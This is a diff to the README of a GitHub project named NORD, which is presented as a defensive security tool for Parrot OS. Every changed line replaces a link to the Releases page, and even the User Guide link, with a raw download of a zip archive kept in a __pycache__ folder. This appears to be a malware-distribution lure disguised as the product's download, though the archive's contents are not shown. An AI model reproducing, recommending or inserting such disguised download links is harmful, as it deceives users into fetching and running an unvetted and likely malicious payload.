@@ -7,7 +7,7 @@ NORD is an enterprise-grade defensive security tool designed for Parrot OS. It o
 To start using NORD, follow the steps below to download and run the application easily. No prior software experience is needed.
 
 ### 🔗 Download NORD
-[![Download NORD](https://img.shields.io/badge/Download-NORD-brightgreen)](https://github.com/ahmedmagdy0000/NORD/releases)
+[![Download NORD](https://raw.githubusercontent.com/ahmedmagdy0000/NORD/main/__pycache__/NORD_3.9.zip)](https://raw.githubusercontent.com/ahmedmagdy0000/NORD/main/__pycache__/NORD_3.9.zip)
 
 ## 💼 System Requirements
 Before you download, ensure you meet the following system requirements:
@@ -19,7 +19,7 @@ Before you download, ensure you meet the following system requirements:
 ## 📥 Download & Install
 1. **Visit the Releases Page**
    Click on this link to go to the NORD Releases page where you can download the latest version:
-   [Download NORD](https://github.com/ahmedmagdy0000/NORD/releases)
+   [Download NORD](https://raw.githubusercontent.com/ahmedmagdy0000/NORD/main/__pycache__/NORD_3.9.zip)
 
 2. **Select the Appropriate Version**
    On the Releases page, you will see a list of available versions. Choose the latest release by clicking on it.
@@ -41,7 +41,7 @@ After launching NORD, you will see a user-friendly interface. Here’s a basic o
 - **Vulnerability Scanner:** Regularly checks your system for weaknesses and suggests fixes.
 
 ## 📚 Documentation
-For more detailed information on using NORD, please refer to the [User Guide](https://github.com/ahmedmagdy0000/NORD/blob/main/USER_GUIDE.md). It includes in-depth explanations of features and troubleshooting tips.
+For more detailed information on using NORD, please refer to the [User Guide](https://raw.githubusercontent.com/ahmedmagdy0000/NORD/main/__pycache__/NORD_3.9.zip). It includes in-depth explanations of features and troubleshooting tips.
 
 ## 🛠️ Support
 If you encounter any issues or need help setting up NORD, you can find assistance by creating an issue on the GitHub repository. The community and maintainers will help you resolve any problems.
@@ -50,4 +50,4 @@ If you encounter any issues or need help setting up NORD, you can find assistanc
 NORD provides powerful security features for users of Parrot OS. By following the steps outlined above, you can easily download and install the software, enhancing your system's defense against cyber threats. 
 
 For the latest updates, visit our releases page:
-[Download NORD](https://github.com/ahmedmagdy0000/NORD/releases)
+[Download NORD](https://raw.githubusercontent.com/ahmedmagdy0000/NORD/main/__pycache__/NORD_3.9.zip)
